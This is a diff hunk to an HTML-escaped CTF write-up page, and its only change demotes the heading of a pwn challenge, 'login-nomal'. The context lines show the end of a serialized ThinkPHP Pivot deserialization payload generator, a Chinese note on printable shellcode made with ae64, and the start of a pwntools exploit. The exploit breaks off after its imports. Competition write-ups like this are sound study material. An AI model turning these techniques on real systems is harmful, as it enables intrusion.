@@ -46,7 +46,7 @@
     &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;urlencode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;think\model\Pivot&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;think\model\Pivot&lt;/span&gt;()))));
 }
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;pwn&#34;&gt;Pwn&lt;/h2&gt;
-&lt;h2 id=&#34;login-nomal&#34;&gt;login-nomal&lt;/h2&gt;
+&lt;h3 id=&#34;login-nomal&#34;&gt;login-nomal&lt;/h3&gt;
 &lt;p&gt;可见字符 shellcode，调用 ae64 脚本，rdx 直接打通&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
 &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; ae64 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; AE64
